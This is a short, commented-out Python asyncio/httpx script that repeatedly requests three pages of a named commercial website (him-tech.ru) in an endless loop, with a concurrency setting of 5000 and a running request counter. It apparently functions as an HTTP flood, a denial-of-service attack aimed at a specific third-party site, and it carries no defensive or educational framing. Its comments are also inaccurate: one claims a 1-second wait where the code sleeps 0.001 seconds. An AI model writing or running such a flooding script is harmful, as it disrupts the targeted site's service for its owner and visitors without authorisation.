# import asyncio
# import httpx
# import time
#
# URLS = [
#     'https://him-tech.ru/flokulyanty/',
#     'https://him-tech.ru/tehnicheskaya-himiya/',
#     'https://him-tech.ru/besfloc-besflok-k051c/'
#     # add more URLs as needed
# ]
#
# REQUESTS_PER_SECOND = 5000
#
# async def fetch(url, client, semaphore):
#     async with semaphore:
#         resp = await client.get(url)
#         print(f"{url}: {resp.status_code}")
#
#
# async def main():
#     counter = 0
#     semaphore = asyncio.Semaphore(REQUESTS_PER_SECOND)
#     async with httpx.AsyncClient() as client:
#         while True:
#             tasks = [fetch(url, client, semaphore) for url in URLS]
#             await asyncio.gather(*tasks)
#             time.sleep(0.001)  # wait 1 second before next batch
#             counter += 1
#             print(f"Total requests made: {counter}")
#
# asyncio.run(main())